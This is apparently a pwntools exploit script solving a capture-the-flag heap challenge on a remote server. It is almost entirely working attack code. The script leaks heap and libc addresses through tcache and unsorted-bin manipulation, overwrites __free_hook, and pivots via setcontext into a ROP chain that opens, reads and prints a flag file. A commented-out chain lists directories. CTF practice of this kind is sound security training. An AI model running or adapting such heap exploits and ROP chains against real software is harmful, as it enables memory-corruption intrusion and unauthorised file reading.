from pwn import *
from hashlib import md5
context(arch='amd64', log_level='debug')
elf = ELF('./pwn')
libc = ELF('./glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc.so.6')
one_gadgets = [0x47c46, 0x47c9a, 0xfcc6e, 0xfdb1e]
poprdi_ret = 0x20B8B
poprsi_ret = 0x20A0B
poprdx_ret = 0x1B96
addrsp_0x28_ret = 0x36426
movrdi_rax_poprbx_poprbp_popr12_jmprcx = 0x9049F
poprcx_ret = 0x1c2b1c
movrdi100ptr_rdx = 0x1034da
movrdx_rax_ret = 0x133e85
# io = process('./pwn')
io = remote('nep.lemonprefect.cn', 32598)

password = b'iamthehackbest'
message = b'\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14\xd8\xc2\xaf\x14'
hexdigest = 54052103791711052204349287341804800

def register(username, password, ensure):
    io.sendlineafter(b'>> ', b'REGISTER')
    io.sendafter(b'PLEASE INPUT YOUR NEW NAME:', username)
    io.sendafter(b'PLEASE INPUT YOUR NEW PASSWD:', password)
    io.sendlineafter(b'PLEASE INSURE REGISTER:', ensure)

def login(username, password):
    io.sendlineafter(b'>> ', b'LOGIN')
    io.sendlineafter(b'PLEASE INPUT YOUR NAME:', username)
    io.sendlineafter(b'PLEASE INPUT YOUR PASSWD:', password)

def change(newname, newpasswd):
    io.sendlineafter(b'>> ', b'CHANGE')
    io.sendlineafter(b'PLEASE INPUT YOUR NAME:', newname)
    io.sendlineafter(b'PLEASE INPUT YOUR PASSWD:', newpasswd)

def remove(id, ensure):
    io.sendlineafter(b'>> ', b'REMOVE')
    io.sendlineafter(b'PLEASE INPUT WHICH ACCOUNT YOU WANT DELE.', str(id).encode())
    io.sendlineafter(b'DO U WANT CLEAN THIS ACCOUNT?', ensure)

def show():
    io.sendlineafter(b'>> ', b'SHOW')

def p128(value):
    result = b''
    for i in range(16):
        byte = (value >> (8*(15-i))) & ((1 << 8) - 1)
        result += p8(byte)
    return result

def get_md5_digint(bytes):
    return int(md5(bytes).hexdigest(), 16)

io.sendlineafter(b'PLEASE INPUT YOUR VERSION CHOICE.\n', b'8')  # get admin

for i in range(20):
    register(b'\x00' * 0x10 + cyclic(0x10) + p128(hexdigest), b'a' * 0x20, b"Y")

show()
io.recvuntil(b'THE ACCOUNT ADDR:\n0x')
heap_addr = int(io.recvuntil(b'\n', drop=True), 16) - 0x10
print(hex(heap_addr))

# tcache
remove(8, "N")
remove(7, "N")
remove(6, "N")
remove(1, "N")
remove(3, "N")
remove(5, "N")
remove(4, "N")

# unsorted bin
remove(0, "N")
remove(2, "N")
register(b'a' * 0xC0 + p64(heap_addr), b'a' * 0x20, b"Y")    # chunk 0
register(b'a' * 0x20, b'a' * 0x20, b"Y")    # chunk 1
register(b'a' * 0x10, b'a' * 0x20, b"Y")    # chunk 1, index 3
show()

io.recvuntil(b'NAME:\n')
main_arena = u64(io.recv(6) + b'\x00\x00') - 88
__malloc_hook = main_arena - 0x10
print(hex(__malloc_hook))
base = __malloc_hook - libc.symbols['__malloc_hook']
print(hex(base))
__free_hook = base + libc.symbols['__free_hook']
print(hex(__free_hook))
realloc = base + libc.symbols['realloc']
setcontext = base + libc.symbols['setcontext']
openfile = base + libc.symbols['open']
readfile = base + libc.symbols['read']
writefile = base + libc.symbols['write']
opendir = base + libc.symbols['opendir']
readdir = base + libc.symbols['readdir64']
mprotect = base + libc.symbols['mprotect']

remove(11, "N")
remove(10, "N")
remove(9, "N")

ROP = p64(0xdeadbeef)
ROP += p64(heap_addr + 0x1700 - 0x250 + 0xB0)       # 0x20
ROP += p64(poprsi_ret + base)
ROP += p64(2)
ROP += p64(openfile)
ROP += p64(poprdi_ret + base)           # 0x40
ROP += p64(3)
ROP += p64(poprsi_ret + base)
ROP += p64(heap_addr + 0x1700 - 0x250)
ROP += p64(poprdx_ret + base)           # 0x60
ROP += p64(48)
ROP += p64(readfile)
ROP += p64(poprdi_ret + base)
ROP += p64(1)                           # 0x80
ROP += p64(poprsi_ret + base)
ROP += p64(heap_addr + 0x1700 - 0x250)
ROP += p64(addrsp_0x28_ret + base)
ROP += p64(heap_addr + 0x1700 - 0x250 + 0x20)                          # 0xA0, rsp
ROP += p64(poprdi_ret + base)               # rcx
ROP += b'flag'.ljust(0x18, b'\x00')   # filename address
ROP += p64(poprdx_ret + base)
ROP += p64(48)
ROP += p64(writefile)

# ROP = p64(0xdeadbeef)
# ROP += p64(heap_addr + 0x1700 - 0x250 + 0x10)
# ROP += p64(opendir)
#
# ROP += p64(movrdx_rax_ret + base)
# ROP += p64(poprdi_ret + base)
# ROP += p64(heap_addr + 0x1700 - 0x250 + 0x10 - 0x100)
# ROP += p64(movrdi100ptr_rdx + base)
#
# ROP += p64(poprcx_ret + base)
# ROP += p64(readdir)
# ROP += p64(movrdi_rax_poprbx_poprbp_popr12_jmprcx + base)
# ROP += p64(0) * 3
# ROP += p64(poprdi_ret + base)
# ROP += p64(1)
# ROP += p64(addrsp_0x28_ret + base)
# ROP += b'./'.ljust(8, b'\x00')
# ROP += p64(heap_addr + 0x1700 - 0x250 + 0x20)       # rsp
# ROP += p64(poprdi_ret + base)       # rcx
# ROP += p64(0xdeadbeef)
# ROP += p64(poprsi_ret + base)
# ROP += p64(heap_addr + 0x1700 - 0x250 + 0x10)
# ROP += p64(poprdx_ret + base)
# ROP += p64(48)
# ROP += p64(writefile)
# ROP += p64(poprdi_ret + base)
# ROP += p64(heap_addr + 0x1700 - 0x250 + 0x10 - 0x100)


# shellcode = ''
register(cyclic(0xC0) + p64(__free_hook - 0x20), b'a' * 0x10, "Y")
register(b'a' * 0x10 + p64(heap_addr + 0x1700 - 0x250 + 0xB0) + ROP, b'a' * 0x10, "Y")     # heap_addr + 0x1700 - 0x250
# register(b'a' * 0x10 + p64(heap_addr + 0x1700 - 0x250 + 0x98) + ROP, b'a' * 0x10, "Y")     # heap_addr + 0x1700 - 0x250
register(b'\x00' * 0x10 + p64(0) + p64(base + one_gadgets[1]) + p64(setcontext + 53), b'a' * 0x10, "Y")

# gdb.attach(io)
# time.sleep(3)
remove(12, "N")     # heap_addr + 0x1700 - 0x250
register(b'a' * 0x10, b'a' * 0x10, b"\x00" * 8)

# register(b'\x00' * 0x10 + cyclic(0x10) + p128(hexdigest), b'a' * 0x20, b"Y")
# register(b'\x00' * 0x10 + cyclic(0x10) + p128(hexdigest), b'a' * 0x20, b"Y")
# for i in range(8):
#     register(cyclic(0x20), cyclic(0x20), b"Y")
# remove(0, "N")
# remove(7, "N")
# remove(6, "N")
# remove(5, "N")
# remove(4, "N")
# remove(3, "N")
# remove(1, "N")
# remove(0, "N")
# remove(2, "N")
# for i in range(7):
#     register(b'a' * 0x10, b'a' * 0x20, b"Y")
# register(b'a'*0x20, b'a', b'Y')
# gdb.attach(io)
# time.sleep(3)
# for i in range(9):
#     # register(b'\x00' * 0x10 + cyclic(0x10) + p128(hexdigest), b'a' * 0x20, b"Y")
#     register(b'a' * 0x10, b'a' * 0x20, b"Y")
#     remove(0, "N")
# register(cyclic(0xA0-1), cyclic(0x20), b"Y")
# change(cyclic(0x20), cyclic(0x20))
# change(cyclic(0x20), cyclic(0x20))
# change(cyclic(0x20), cyclic(0x20))
# gdb.attach(io)
# time.sleep(5)

io.interactive()